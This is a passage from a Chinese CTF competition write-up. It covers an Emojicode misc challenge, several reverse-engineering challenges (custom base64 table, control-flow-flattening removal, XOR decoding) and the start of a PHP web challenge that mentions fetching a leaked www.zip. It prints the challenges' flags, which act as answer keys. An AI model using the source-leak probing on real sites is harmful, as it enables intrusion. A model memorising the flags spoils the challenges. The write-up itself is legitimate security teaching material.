class="string">:key:</span></span><br><span class="line"><span class="string">:bulb:</span></span><br><span class="line"><span class="string">:flashlight:</span></span><br><span class="line"><span class="string">:high_brightness:</span></span><br><span class="line"><span class="string">:low_brightness:</span></span><br><span class="line"><span class="string">:electric_plug:</span></span><br><span class="line"><span class="string">:battery:</span></span><br><span class="line"><span class="string">:calling:</span></span><br><span class="line"><span class="string">:email:</span></span><br><span class="line"><span class="string">:mailbox:</span></span><br><span class="line"><span class="string">:postbox:</span></span><br><span class="line"><span class="string">:bath:</span></span><br><span class="line"><span class="string">:bathtub:</span></span><br><span class="line"><span class="string">:shower:</span></span><br><span class="line"><span class="string">:toilet:</span></span><br><span class="line"><span class="string">:wrench:</span></span><br><span class="line"><span class="string">:nut_and_bolt:</span></span><br><span class="line"><span class="string">:hammer:</span></span><br><span class="line"><span class="string">:seat:</span></span><br><span class="line"><span class="string">:moneybag:</span></span><br><span class="line"><span class="string">:yen:</span></span><br><span class="line"><span class="string">:dollar:</span></span><br><span class="line"><span class="string">:pound:</span></span><br><span class="line"><span class="string">:euro:</span></span><br><span class="line"><span class="string">:credit_card:</span></span><br><span class="line"><span class="string">:money_with_wings:</span></span><br><span class="line"><span class="string">:e-mail:</span></span><br><span class="line"><span class="string">:inbox_tray:</span></span><br><span class="line"><span class="string">:outbox_tray:</span></span><br><span class="line"><span class="string">:envelope:</span></span><br><span class="line"><span class="string">:incoming_envelope:</span></span><br><span class="line"><span class="string">:postal_horn:</span></span><br><span class="line"><span class="string">:mailbox_closed:</span></span><br><span class="line"><span class="string">:mailbox_with_mail:</span></span><br><span class="line"><span class="string">:mailbox_with_no_mail:</span></span><br><span class="line"><span class="string">:package:</span></span><br><span class="line"><span class="string">:door:</span></span><br><span class="line"><span class="string">:smoking:</span></span><br><span class="line"><span class="string">:bomb:</span></span><br><span class="line"><span class="string">:gun:</span></span><br><span class="line"><span class="string">:hocho:</span></span><br><span class="line"><span class="string">:pill:</span></span><br><span class="line"><span class="string">:syringe:</span></span><br><span class="line"><span class="string">:page_facing_up:</span></span><br><span class="line"><span class="string">:page_with_curl:</span></span><br><span class="line"><span class="string">:bookmark_tabs:</span></span><br><span class="line"><span class="string">:bar_chart:</span></span><br><span class="line"><span class="string">:chart_with_upwards_trend:</span></span><br><span class="line"><span class="string">:chart_with_downwards_trend:</span></span><br><span class="line"><span class="string">:scroll:</span></span><br><span class="line"><span class="string">:clipboard:</span></span><br><span class="line"><span class="string">:calendar:</span></span><br><span class="line"><span class="string">:date:</span></span><br><span class="line"><span class="string">:card_index:</span></span><br><span class="line"><span class="string">:file_folder:</span></span><br><span class="line"><span class="string">:open_file_folder:</span></span><br><span class="line"><span class="string">:scissors:</span></span><br><span class="line"><span class="string">:pushpin:</span></span><br><span class="line"><span class="string">:paperclip:</span></span><br><span class="line"><span class="string">:black_nib:</span></span><br><span class="line"><span class="string">:pencil2:</span></span><br><span class="line"><span class="string">:straight_ruler:</span></span><br><span class="line"><span class="string">:triangular_ruler:</span></span><br><span class="line"><span class="string">:closed_book:</span></span><br><span class="line"><span class="string">:green_book:</span></span><br><span class="line"><span class="string">:blue_book:</span></span><br><span class="line"><span class="string">:orange_book:</span></span><br><span class="line"><span class="string">:notebook:</span></span><br><span class="line"><span class="string">:notebook_with_decorative_cover:</span></span><br><span class="line"><span class="string">:ledger:</span></span><br><span class="line"><span class="string">:books:</span></span><br><span class="line"><span class="string">:bookmark:</span></span><br><span class="line"><span class="string">:name_badge:</span></span><br><span class="line"><span class="string">:microscope:</span></span><br><span class="line"><span class="string">:telescope:</span></span><br><span class="line"><span class="string">:newspaper:</span></span><br><span class="line"><span class="string">:football:</span></span><br><span class="line"><span class="string">:basketball:</span></span><br><span class="line"><span class="string">:soccer:</span></span><br><span class="line"><span class="string">:baseball:</span></span><br><span class="line"><span class="string">:tennis:</span></span><br><span class="line"><span class="string">:8ball:</span></span><br><span class="line"><span class="string">:rugby_football:</span></span><br><span class="line"><span class="string">:bowling:</span></span><br><span class="line"><span class="string">:golf:</span></span><br><span class="line"><span class="string">:mountain_bicyclist:</span></span><br><span class="line"><span class="string">:bicyclist:</span></span><br><span class="line"><span class="string">:horse_racing:</span></span><br><span class="line"><span class="string">:snowboarder:</span></span><br><span class="line"><span class="string">:swimmer:</span></span><br><span class="line"><span class="string">:surfer:</span></span><br><span class="line"><span class="string">:ski:</span></span><br><span class="line"><span class="string">:spades:</span></span><br><span class="line"><span class="string">:hearts:</span></span><br><span class="line"><span class="string">:clubs:</span></span><br><span class="line"><span class="string">:diamonds:</span></span><br><span class="line"><span class="string">:gem:</span></span><br><span class="line"><span class="string">:ring:</span></span><br><span class="line"><span class="string">:trophy:</span></span><br><span class="line"><span class="string">:musical_score:</span></span><br><span class="line"><span class="string">:musical_keyboard:</span></span><br><span class="line"><span class="string">:violin:</span></span><br><span class="line"><span class="string">:space_invader:</span></span><br><span class="line"><span class="string">:video_game:</span></span><br><span class="line"><span class="string">:black_joker:</span></span><br><span class="line"><span class="string">:flower_playing_cards:</span></span><br><span class="line"><span class="string">:game_die:</span></span><br><span class="line"><span class="string">:dart:</span></span><br><span class="line"><span class="string">:mahjong:</span></span><br><span class="line"><span class="string">:clapper:</span></span><br><span class="line"><span class="string">:memo:</span></span><br><span class="line"><span class="string">:pencil:</span></span><br><span class="line"><span class="string">:book:</span></span><br><span class="line"><span class="string">:art:</span></span><br><span class="line"><span class="string">:microphone:</span></span><br><span class="line"><span class="string">:headphones:</span></span><br><span class="line"><span class="string">:trumpet:</span></span><br><span class="line"><span class="string">:saxophone:</span></span><br><span class="line"><span class="string">:guitar:</span></span><br><span class="line"><span class="string">:shoe:</span></span><br><span class="line"><span class="string">:sandal:</span></span><br><span class="line"><span class="string">:high_heel:</span></span><br><span class="line"><span class="string">:lipstick:</span></span><br><span class="line"><span class="string">:boot:</span></span><br><span class="line"><span class="string">:shirt:</span></span><br><span class="line"><span class="string">:tshirt:</span></span><br><span class="line"><span class="string">:necktie:</span></span><br><span class="line"><span class="string">:womans_clothes:</span></span><br><span class="line"><span class="string">:dress:</span></span><br><span class="line"><span class="string">:running_shirt_with_sash:</span></span><br><span class="line"><span class="string">:jeans:</span></span><br><span class="line"><span class="string">:kimono:</span></span><br><span class="line"><span class="string">:bikini:</span></span><br><span class="line"><span class="string">:ribbon:</span></span><br><span class="line"><span class="string">:tophat:</span></span><br><span class="line"><span class="string">:crown:</span></span><br><span class="line"><span class="string">:womans_hat:</span></span><br><span class="line"><span class="string">:mans_shoe:</span></span><br><span class="line"><span class="string">:closed_umbrella:</span></span><br><span class="line"><span class="string">:briefcase:</span></span><br><span class="line"><span class="string">:handbag:</span></span><br><span class="line"><span class="string">:pouch:</span></span><br><span class="line"><span class="string">:purse:</span></span><br><span class="line"><span class="string">:eyeglasses:</span></span><br><span class="line"><span class="string">:fishing_pole_and_fish:</span></span><br><span class="line"><span class="string">:coffee:</span></span><br><span class="line"><span class="string">:tea:</span></span><br><span class="line"><span class="string">:sake:</span></span><br><span class="line"><span class="string">:baby_bottle:</span></span><br><span class="line"><span class="string">:beer:</span></span><br><span class="line"><span class="string">:beers:</span></span><br><span class="line"><span class="string">:cocktail:</span></span><br><span class="line"><span class="string">:tropical_drink:</span></span><br><span class="line"><span class="string">:wine_glass:</span></span><br><span class="line"><span class="string">:fork_and_knife:</span></span><br><span class="line"><span class="string">:pizza:</span></span><br><span class="line"><span class="string">:hamburger:</span></span><br><span class="line"><span class="string">:fries:</span></span><br><span class="line"><span class="string">:poultry_leg:</span></span><br><span class="line"><span class="string">:meat_on_bone:</span></span><br><span class="line"><span class="string">:spaghetti:</span></span><br><span class="line"><span class="string">:curry:</span></span><br><span class="line"><span class="string">:fried_shrimp:</span></span><br><span class="line"><span class="string">:bento:</span></span><br><span class="line"><span class="string">:sushi:</span></span><br><span class="line"><span class="string">:fish_cake:</span></span><br><span class="line"><span class="string">:rice_ball:</span></span><br><span class="line"><span class="string">:rice_cracker:</span></span><br><span class="line"><span class="string">:rice:</span></span><br><span class="line"><span class="string">:ramen:</span></span><br><span class="line"><span class="string">:stew:</span></span><br><span class="line"><span class="string">:oden:</span></span><br><span class="line"><span class="string">:dango:</span></span><br><span class="line"><span class="string">:egg:</span></span><br><span class="line"><span class="string">:bread:</span></span><br><span class="line"><span class="string">:doughnut:</span></span><br><span class="line"><span class="string">:custard:</span></span><br><span class="line"><span class="string">:icecream:</span></span><br><span class="line"><span class="string">:ice_cream:</span></span><br><span class="line"><span class="string">:shaved_ice:</span></span><br><span class="line"><span class="string">:birthday:</span></span><br><span class="line"><span class="string">:cake:</span></span><br><span class="line"><span class="string">:cookie:</span></span><br><span class="line"><span class="string">:chocolate_bar:</span></span><br><span class="line"><span class="string">:candy:</span></span><br><span class="line"><span class="string">:lollipop:</span></span><br><span class="line"><span class="string">:honey_pot:</span></span><br><span class="line"><span class="string">:apple:</span></span><br><span class="line"><span class="string">:green_apple:</span></span><br><span class="line"><span class="string">:tangerine:</span></span><br><span class="line"><span class="string">:lemon:</span></span><br><span class="line"><span class="string">:cherries:</span></span><br><span class="line"><span class="string">:grapes:</span></span><br><span class="line"><span class="string">:watermelon:</span></span><br><span class="line"><span class="string">:strawberry:</span></span><br><span class="line"><span class="string">:peach:</span></span><br><span class="line"><span class="string">:melon:</span></span><br><span class="line"><span class="string">:banana:</span></span><br><span class="line"><span class="string">:pear:</span></span><br><span class="line"><span class="string">:pineapple:</span></span><br><span class="line"><span class="string">:sweet_potato:</span></span><br><span class="line"><span class="string">:eggplant:</span></span><br><span class="line"><span class="string">:tomato:</span></span><br><span class="line"><span class="string">:corn:</span></span><br><span class="line"><span class="string">:house:</span></span><br><span class="line"><span class="string">:house_with_garden:</span></span><br><span class="line"><span class="string">:school:</span></span><br><span class="line"><span class="string">:office:</span></span><br><span class="line"><span class="string">:post_office:</span></span><br><span class="line"><span class="string">:hospital:</span></span><br><span class="line"><span class="string">:bank:</span></span><br><span class="line"><span class="string">:convenience_store:</span></span><br><span class="line"><span class="string">:love_hotel:</span></span><br><span class="line"><span class="string">:hotel:</span></span><br><span class="line"><span class="string">:wedding:</span></span><br><span class="line"><span class="string">:church:</span></span><br><span class="line"><span class="string">:department_store:</span></span><br><span class="line"><span class="string">:european_post_office:</span></span><br><span class="line"><span class="string">:city_sunrise:</span></span><br><span class="line"><span class="string">:city_sunset:</span></span><br><span class="line"><span class="string">:japanese_castle:</span></span><br><span class="line"><span class="string">:european_castle:</span></span><br><span class="line"><span class="string">:tent:</span></span><br><span class="line"><span class="string">:factory:</span></span><br><span class="line"><span class="string">:tokyo_tower:</span></span><br><span class="line"><span class="string">:japan:</span></span><br><span class="line"><span class="string">:mount_fuji:</span></span><br><span class="line"><span class="string">:sunrise_over_mountains:</span></span><br><span class="line"><span class="string">:sunrise:</span></span><br><span class="line"><span class="string">:stars:</span></span><br><span class="line"><span class="string">:statue_of_liberty:</span></span><br><span class="line"><span class="string">:bridge_at_night:</span></span><br><span class="line"><span class="string">:carousel_horse:</span></span><br><span class="line"><span class="string">:rainbow:</span></span><br><span class="line"><span class="string">:ferris_wheel:</span></span><br><span class="line"><span class="string">:fountain:</span></span><br><span class="line"><span class="string">:roller_coaster:</span></span><br><span class="line"><span class="string">:ship:</span></span><br><span class="line"><span class="string">:speedboat:</span></span><br><span class="line"><span class="string">:boat:</span></span><br><span class="line"><span class="string">:sailboat:</span></span><br><span class="line"><span class="string">:rowboat:</span></span><br><span class="line"><span class="string">:anchor:</span></span><br><span class="line"><span class="string">:rocket:</span></span><br><span class="line"><span class="string">:airplane:</span></span><br><span class="line"><span class="string">:helicopter:</span></span><br><span class="line"><span class="string">:steam_locomotive:</span></span><br><span class="line"><span class="string">:tram:</span></span><br><span class="line"><span class="string">:mountain_railway:</span></span><br><span class="line"><span class="string">:bike:</span></span><br><span class="line"><span class="string">:aerial_tramway:</span></span><br><span class="line"><span class="string">:suspension_railway:</span></span><br><span class="line"><span class="string">:mountain_cableway:</span></span><br><span class="line"><span class="string">:tractor:</span></span><br><span class="line"><span class="string">:blue_car:</span></span><br><span class="line"><span class="string">:oncoming_automobile:</span></span><br><span class="line"><span class="string">:car:</span></span><br><span class="line"><span class="string">:red_car:</span></span><br><span class="line"><span class="string">:taxi:</span></span><br><span class="line"><span class="string">:oncoming_taxi:</span></span><br><span class="line"><span class="string">:articulated_lorry:</span></span><br><span class="line"><span class="string">:bus:</span></span><br><span class="line"><span class="string">:oncoming_bus:</span></span><br><span class="line"><span class="string">:rotating_light:</span></span><br><span class="line"><span class="string">:police_car:</span></span><br><span class="line"><span class="string">:oncoming_police_car:</span></span><br><span class="line"><span class="string">:fire_engine:</span></span><br><span class="line"><span class="string">:ambulance:</span></span><br><span class="line"><span class="string">:minibus:</span></span><br><span class="line"><span class="string">:truck:</span></span><br><span class="line"><span class="string">:train:</span></span><br><span class="line"><span class="string">:station:</span></span><br><span class="line"><span class="string">:train2:</span></span><br><span class="line"><span class="string">:bullettrain_front:</span></span><br><span class="line"><span class="string">:bullettrain_side:</span></span><br><span class="line"><span class="string">:light_rail:</span></span><br><span class="line"><span class="string">:monorail:</span></span><br><span class="line"><span class="string">:railway_car:</span></span><br><span class="line"><span class="string">:trolleybus:</span></span><br><span class="line"><span class="string">:ticket:</span></span><br><span class="line"><span class="string">:fuelpump:</span></span><br><span class="line"><span class="string">:vertical_traffic_light:</span></span><br><span class="line"><span class="string">:traffic_light:</span></span><br><span class="line"><span class="string">:warning:</span></span><br><span class="line"><span class="string">:construction:</span></span><br><span class="line"><span class="string">:beginner:</span></span><br><span class="line"><span class="string">:atm:</span></span><br><span class="line"><span class="string">:slot_machine:</span></span><br><span class="line"><span class="string">:busstop:</span></span><br><span class="line"><span class="string">:barber:</span></span><br><span class="line"><span class="string">:hotsprings:</span></span><br><span class="line"><span class="string">:checkered_flag:</span></span><br><span class="line"><span class="string">:crossed_flags:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">out = emoji_list.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">out = out[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    echo = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        emojiSymbol = emoji.emojize(out[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(out) - <span class="number">1</span>)], use_aliases=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> emojiSymbol:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        echo += emojiSymbol</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">26</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    final += <span class="string">&#x27;🔤&#x27;</span> + echo + <span class="string">&#x27;🔤 &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(final.encode())</span><br></pre></td></tr></table></figure><h4 id="解题人视角"><a href="#解题人视角" class="headerlink" title="解题人视角"></a>解题人视角</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4br2deatj61ds0astb902.jpg" alt=""></p><p>binwalk -e 分离出一个压缩包，里面俩文件，先file一下看看都是啥</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4brvm8d1j60mm03wt9602.jpg" alt=""></p><p>都是文本文件，用code打开康康</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bslwkyjj60g20a4t8t02.jpg" alt=""></p><p>hint.txt如上</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bt5j38aj61nc0c840b02.jpg" alt=""></p><p>flag.emojic文件如上，乍一看是emoji编码，发现解不动，搜一下hint</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bus5qpwj619q0u0jwr02.jpg" alt=""></p><p>发现emojicode，是一种编程语言</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bwhh0blj61gs0u00yx02.jpg" alt=""></p><p>这一坨东西翻译成python就是如图所示，就定义了一个列表，😀 是输出，🐽是访问集合中元素，很简单，稍微读读文档就知道咋回事了。</p><p>那看我们的源代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">🏁 🍇</span><br><span class="line">  🍿 🔤😼👿🏇🚐👭🏇📫♣😔🐡🎨😼🔅👯🙎💘📇📺💡👮🐉👴📨😁👖📁🔤 🔤⛽♨👹🌅🎥🏇☝📺🗽💰🎯🐛🐓📛🐓🐸🌆💍🍐🌁💪😴🚢🐇😘👘🔤 🔤👝👣👘👞👲👰🐧👬👖👘👩🐪👖👜👤🐧👡🐨👖👤👘👪👫🐪👩👴🔤 🔤😿👂🗾🎲📤🚣📞☎🐰🍳✋🐩⛺💙🛀🎵😾✊👯🔔🍪🔮🌌🌂😉🌻🔤 🔤😳🍔🏡🐮♠📷👷🌷🍋🐃💂👲⌛📌☕🏪🚗🌴👝💶🔮📲😼☂🌍🍢🔤 🔤💜😱⛳🐫📡🚥🍙📔📌🙆🎻🐣➿🎊🐷🍝☎🎻🍒😁😝🏬💶🚥🐼👅🔤 🔤😻🍁🚓💍💨⏳💚🚬🍋🎡🐒👎😹🔐😳👱🐂🍞🙍🎍🎀🍼🎸👅🔕📀🔤 🔤📠♥🐶🔑⌚😟❓🍠♨👜🎹🏀😩👡🍒👶🍠🌚🐩👸🐹📻🍀🛁❔📦🔤 🔤👇🍦🌘👝💷💧📞👦🍑🐂🐞💴😇🎄⏰💶💃🐅🌗❗📣🔰🎆⚽😟📢🔤 🔤😥♠🐕🙌🐇🙊😳🐅⚓🎋🌜♨😵🔇🍬🎥😬🍝📄🏯🍶⚠📏🌽📦🐗🔤 🔤🐷🍦🚍🎆🐺📪🐚🐋🏫👞😥🚌🍭🎌👪💪🎱📆🍛⛵🔖😱🙎🐝🐫🍎🔤 🔤👥📯🍔📝🎉🙇⭐✋🐏❄🚎👩🚁🎲🚀❗☂🍋✂🔏✋👳🍕🍭🚑💎🔤 🔤📕🌺🏡🙆🍌😗👕🏆♣🐊👦😲🏀💑🍫👱📊🌄🐌🍩🍢🏬😴🎴📛🏦🔤 🔤😰👡🎈🐎🔉🍚🔌🎍🔌📣🙋⛳😒🍏🚪🌍👯💰😂❗💗🚤💈📁🐷🔍🔤 🔤🐕🍂🍶🚡🚌😯🐝💃🍐🍅🏥🍬👉🎣👨🎨📤🍛👰🚌🍎🐉🌹📯🚙🔍🔤 🔤🍤🍚😠📕🎓🙊👍🔨🐖👇👓👐🌅💃🎨🎿😺🌁💅⚡📫👚👢🎈🍚🔒🔤 🔤🏯🏊🌁📬🏁🏬👠📲🍁😪💚👶🎫🎄🍌👲📟💫🍓😥😾😂🌾👑🎆🎠🔤 🔤🎑🍰👧👆🍼👡🗻❗🏩📙📄💏🎣🚗📢📕📃☎💍🀄🍁😊🔮👿👜👎🔤 🔤✌🎑🚙🚋🏉🔓😸🔥🐓🍠📎🐩📂📒➿🍙👄🍹🎒😏🐩👥🔋🍰🐸🚲🔤 🔤👲💃💋💧😥🙀♦🚴🐳😉🌱🍎💗😺😿🏇😁👇🏫😄🐕☎😰🚢⛽🌜🔤 🔤👾🗽🎌🎊⛽😪😮📠😢🐜😄😱😝📜🎢🍺🎷🍦👊🌎💂🎐👋🐼🏡🔮🔤 🔤👅🌌⛽🌋🐖🔒🔒🍜🍗🎫🙏🎤🔔☎📊📹🐘📖🐟✨💔👊👻📜🐬🎣🔤 🔤💘📓🐵💀🎹✊🔌🌼🔋😖🌓💁🍫📝🏃👥⛳🙀🎉🐜😌📐👜🙀🎂👄🔤 🔤👡👰🐐💪📐🎏👆😁👧🍥🐓👱🎏😊🚖☺🌓🚢🎈🎋🌽😓🎷🎎🍻⛺🔤 🔤☝💒😃👠👗👇🐆🌆⚠🚔😷🎺🏥🙎🌈👾👏😯🐋🔋💄☕💔🐜😞💪🔤 🔤🌸🐳💡📎🐹😆🍓☀👗🚧🚢🍔🔌😨📷👳💧🐾🐝🔕🐍👪🚒🐸🔮👨🔤 🔤🐺🏇👔🍀🌛🏡🐱🚉😣♠👞🚂🙋☎🚅🌈🌋📆🍙🙉👨🍲📙💎✋🏩🔤 🔤🐓🏃📎🌇🍏🌹☝🎻🐧😪🐃💳💰🍐👇🐟🙇😱📡👝👄📐🔪☁💬⭐🔤 🔤💉🌙☀📭📨👋🌆🚝💘💻😄💩🔋🐟🔈📢👍🌖📌🐲💕🍛❕🍷🏀🐸🔤 🔤🐤👫🚠💨📖🚦🔑📥🔪🏈🚒💌🌴👪😦🙇🌍📘😍😞👲🍸🐙☎🎨😸🔤  🍆 ➡️ list</span><br><span class="line">  💭 😀 🐽list 2❗️❗️</span><br><span class="line">🍉</span><br></pre></td></tr></table></figure><p>两个🔤🔤中间跟的是常量，所以这中间的一堆emoji就是字符串，然后后面访问了list[2]这个元素，可以下载emojicode然后编译跑一遍，但是没有输出，因为多了一个💭</p><p><a href="https://www.emojicode.org/docs/reference/basics.html">https://www.emojicode.org/docs/reference/basics.html</a></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c1th4pnj61n30u0q7v02.jpg" alt=""></p><p>其实就是个注释，去掉即可</p><p>本质就是访问列表中的2号元素，拿出来是这个东西👝👣👘👞👲👰🐧👬👖👘👩🐪👖👜👤🐧👡🐨👖👤👘👪👫🐪👩👴</p><p>emoji decode解一下获得flag 网址：<a href="http://www.atoolbox.net/Tool.php?Id=937">http://www.atoolbox.net/Tool.php?Id=937</a></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c3e2luej61d80u0wgn02.jpg" alt=""></p><p>当然也可以去掉注释，然后编译一下，然后再去emoji解码</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c5do0z5j60le08sgn202.jpg" alt=""></p><p>flag{y0u_ar3_em0j1_mast3r}</p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h3><p>flag{l3m0n_l0v3_bas364}</p><p>最基本的base64代码，不过换了个表，解码就好</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&quot;zMXHz3TSm20WBL9SmhyZx2jHCZm2nh0=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1.translate(<span class="built_in">str</span>.maketrans(table,old_table)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5f6t4phxj60ry0cwdhj02.jpg" alt=""></p><h3 id="equation"><a href="#equation" class="headerlink" title="equation"></a>equation</h3><p>2020羊城杯原题，只不过去掉了pyc反编译的过程，原题链接：<a href="https://la13x.github.io/2021/04/16/buuctf-reverse1/#1-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-login">https://la13x.github.io/2021/04/16/buuctf-reverse1/#1-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-login</a></p><p>flag{58964088b637e50d3a22b9510c1d1ef8}</p><h3 id="flattening"><a href="#flattening" class="headerlink" title="flattening"></a>flattening</h3><h4 id="出题人视角-1"><a href="#出题人视角-1" class="headerlink" title="出题人视角"></a>出题人视角</h4><p>WDNMD 真难编译，出这个题让👴🏻知道了编译不是靠人品</p><p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211005213507923.png" alt=""></p><p>gcc和g++要切到8.x版本才行，然后要改个啥文件来着char改为uint_8好像是，不管了，反正👴🏻编好了，总之就是很水的一个题，知道混淆技术了那就是白给题，反正👴🏻是👣本小子，👴🏻只会用工具去混淆，👴🏻还有很多东西要学</p><h4 id="解题人视角-1"><a href="#解题人视角-1" class="headerlink" title="解题人视角"></a>解题人视角</h4><p>ida走一波</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rpaar0aj314f0u0tap.jpg" alt=""></p><p>WDNMD，意识到并不简单，看看CFG</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rpr6j8mj618d0u0go702.jpg" alt=""></p><p>血压上来了，但是问题不大，控制流平坦化，参见这个：<a href="https://la13x.github.io/2021/04/18/hardCpp/">https://la13x.github.io/2021/04/18/hardCpp/</a></p><p>用deflat一把梭，先找找入口地址</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rox99y0j30cs05umxr.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rom2dzkj313c0asjug.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rsecpypj30k40qwjs6.jpg" alt=""></p><p>舒服了</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rsv20vlj315o0iwacm.jpg" alt=""></p><p>什么白给签到题😅</p><p>直接在data段找到key每个值异或0x37就出了</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4s3b74hkj614c0u0tan02.jpg" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> key[] =</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">81</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">64</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">81</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">68</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">78</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">68</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">55</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(key)/<span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, key[i]^<span class="number">0x37</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4s5ucmtgj30ik05owf4.jpg" alt=""></p><p>flag{C0ntr0L_f10w_f1att3ning_1s_r3a11y_1nt3r3st1ng}</p><h1 id="wp-by-Sparta-EN"><a href="#wp-by-Sparta-EN" class="headerlink" title="wp by Sparta_EN"></a>wp by Sparta_EN</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>根据描述 直接在 CTFd 页面查看源码</p><p><img src="https://i.loli.net/2021/10/05/f9hUnSqNLdQjtcZ.png" alt="image.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Simple-PHP"><a href="#Simple-PHP" class="headerlink" title="Simple PHP"></a>Simple PHP</h3><p><code>www.zip</code> 获取源码 <code>debug_only/infoinfoinfome.php</code> 